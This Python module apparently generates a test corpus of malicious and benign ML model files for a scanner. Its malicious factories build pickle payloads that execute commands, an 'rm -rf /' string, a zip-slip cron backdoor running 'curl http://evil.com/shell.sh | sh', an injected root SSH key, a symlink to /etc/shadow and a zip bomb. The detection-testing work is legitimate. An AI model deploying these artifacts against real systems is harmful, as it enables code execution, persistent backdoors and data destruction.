"""Pre-built artifact adversarial payloads."""

from __future__ import annotations

import io
import json
import struct
import zipfile

from ..base import Payload, PayloadCategory


class ArtifactPayloadFactory:

    @classmethod
    def all_payloads(cls) -> list[Payload]:
        return cls.malicious_payloads() + cls.benign_payloads()

    @classmethod
    def malicious_payloads(cls) -> list[Payload]:
        return [
            cls._gguf_overflow(),
            cls._gguf_rce_kv(),
            cls._safetensors_huge_header(),
            cls._safetensors_rce_meta(),
            cls._pytorch_pickle_rce(),
            cls._pytorch_path_traversal(),
            cls._zip_slip_cron(),
            cls._zip_slip_ssh(),
            cls._zip_symlink(),
            cls._zip_bomb(),
            cls._onnx_overflow(),
            cls._polyglot_pickle_zip(),
        ]

    @classmethod
    def benign_payloads(cls) -> list[Payload]:
        return [
            cls._benign_gguf(),
            cls._benign_safetensors(),
            cls._benign_zip(),
        ]

    @staticmethod
    def _gguf_overflow() -> Payload:
        buf = io.BytesIO()
        buf.write(b"GGUF")
        buf.write(struct.pack("<I", 3))
        buf.write(struct.pack("<Q", 0xFFFFFFFFFFFFFFFF))  # tensor count overflow
        buf.write(struct.pack("<Q", 0xFFFFFFFFFFFFFFFF))  # kv count overflow
        return Payload(
            name="artifact_gguf_overflow", category=PayloadCategory.EVASION,
            data=buf.getvalue(), severity_expected="HIGH",
            tags=["ARTIFACT-GGUF-001"],
        )

    @staticmethod
    def _gguf_rce_kv() -> Payload:
        buf = io.BytesIO()
        buf.write(b"GGUF")
        buf.write(struct.pack("<I", 3))
        buf.write(struct.pack("<Q", 0))
        buf.write(struct.pack("<Q", 1))
        key = b"general.name"
        buf.write(struct.pack("<Q", len(key)))
        buf.write(key)
        buf.write(struct.pack("<I", 8))  # string type
        val = b"__import__('os').system('rm -rf /')"
        buf.write(struct.pack("<Q", len(val)))
        buf.write(val)
        return Payload(
            name="artifact_gguf_rce_kv", category=PayloadCategory.RCE,
            data=buf.getvalue(), severity_expected="CRITICAL",
            tags=["ARTIFACT-GGUF-002"],
        )

    @staticmethod
    def _safetensors_huge_header() -> Payload:
        return Payload(
            name="artifact_safetensors_huge",
            category=PayloadCategory.EVASION,
            data=struct.pack("<Q", 0xFFFFFFFFFFFFFFFF) + b"\x00" * 100,
            severity_expected="HIGH",
            tags=["ARTIFACT-SAFE-001"],
        )

    @staticmethod
    def _safetensors_rce_meta() -> Payload:
        header = json.dumps({
            "weight": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
            "__metadata__": {"eval": "__import__('os').system('id')"},
        }).encode()
        return Payload(
            name="artifact_safetensors_rce",
            category=PayloadCategory.CODE_INJECTION,
            data=struct.pack("<Q", len(header)) + header + b"\x00" * 4,
            severity_expected="CRITICAL",
            tags=["ARTIFACT-SAFE-002"],
        )

    @staticmethod
    def _pytorch_pickle_rce() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("archive/data.pkl",
                        b"\x80\x02cos\nsystem\n(S'id'\ntR.")
        return Payload(
            name="artifact_pytorch_pickle_rce",
            category=PayloadCategory.DESERIALIZATION,
            data=buf.getvalue(), severity_expected="CRITICAL",
            tags=["ARTIFACT-PT-001"],
        )

    @staticmethod
    def _pytorch_path_traversal() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("archive/data.pkl", b"\x80\x02N.")
            zf.writestr("../../../tmp/pwned", b"PWNED")
        return Payload(
            name="artifact_pytorch_path_traversal",
            category=PayloadCategory.PATH_TRAVERSAL,
            data=buf.getvalue(), severity_expected="HIGH",
            tags=["ARTIFACT-PT-002"],
        )

    @staticmethod
    def _zip_slip_cron() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("../../../etc/cron.d/backdoor",
                        b"* * * * * root curl http://evil.com/shell.sh | sh")
        return Payload(
            name="artifact_zip_slip_cron",
            category=PayloadCategory.PATH_TRAVERSAL,
            data=buf.getvalue(), severity_expected="CRITICAL",
            tags=["ARTIFACT-ZIP-001"],
        )

    @staticmethod
    def _zip_slip_ssh() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("../../../root/.ssh/authorized_keys",
                        b"ssh-rsa AAAAB3NzaC1yc2EAAAA attacker@evil")
        return Payload(
            name="artifact_zip_slip_ssh",
            category=PayloadCategory.PATH_TRAVERSAL,
            data=buf.getvalue(), severity_expected="CRITICAL",
            tags=["ARTIFACT-ZIP-002"],
        )

    @staticmethod
    def _zip_symlink() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo("symlink_etc_shadow")
            info.create_system = 3  # Unix
            info.external_attr = 0xA1ED0000  # symlink
            zf.writestr(info, "/etc/shadow")
        return Payload(
            name="artifact_zip_symlink",
            category=PayloadCategory.PATH_TRAVERSAL,
            data=buf.getvalue(), severity_expected="HIGH",
            tags=["ARTIFACT-ZIP-003"],
        )

    @staticmethod
    def _zip_bomb() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("bomb.txt", b"\x00" * (10 * 1024 * 1024))
        return Payload(
            name="artifact_zip_bomb",
            category=PayloadCategory.EVASION,
            data=buf.getvalue(), severity_expected="MEDIUM",
            tags=["ARTIFACT-ZIP-004"],
        )

    @staticmethod
    def _onnx_overflow() -> Payload:
        buf = io.BytesIO()
        buf.write(b"\x08\xFF\x01")  # ir_version varint overflow
        buf.write(b"\x12\x7F" + b"A" * 127)  # producer name oversized
        buf.write(b"\x28\xFF\xFF\xFF\xFF\x0F")  # model version max
        return Payload(
            name="artifact_onnx_overflow",
            category=PayloadCategory.EVASION,
            data=buf.getvalue(), severity_expected="MEDIUM",
            tags=["ARTIFACT-ONNX-001"],
        )

    @staticmethod
    def _polyglot_pickle_zip() -> Payload:
        pickle_exec = b"\x80\x02cos\nsystem\n(S'id'\ntR."
        buf = io.BytesIO()
        buf.write(pickle_exec)
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w") as zf:
            zf.writestr("data.txt", b"normal data")
        buf.write(zip_buf.getvalue())
        return Payload(
            name="artifact_polyglot_pickle_zip",
            category=PayloadCategory.DESERIALIZATION,
            data=buf.getvalue(), severity_expected="CRITICAL",
            tags=["ARTIFACT-POLY-001"],
        )

    @staticmethod
    def _benign_gguf() -> Payload:
        buf = io.BytesIO()
        buf.write(b"GGUF")
        buf.write(struct.pack("<I", 3))
        buf.write(struct.pack("<Q", 0))
        buf.write(struct.pack("<Q", 0))
        return Payload(
            name="artifact_benign_gguf", category=PayloadCategory.BENIGN,
            data=buf.getvalue(), severity_expected="NONE",
        )

    @staticmethod
    def _benign_safetensors() -> Payload:
        header = json.dumps({
            "weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
        }).encode()
        data = struct.pack("<Q", len(header)) + header + b"\x00" * 16
        return Payload(
            name="artifact_benign_safetensors", category=PayloadCategory.BENIGN,
            data=data, severity_expected="NONE",
        )

    @staticmethod
    def _benign_zip() -> Payload:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("readme.txt", b"This is a normal archive.")
        return Payload(
            name="artifact_benign_zip", category=PayloadCategory.BENIGN,
            data=buf.getvalue(), severity_expected="NONE",
        )
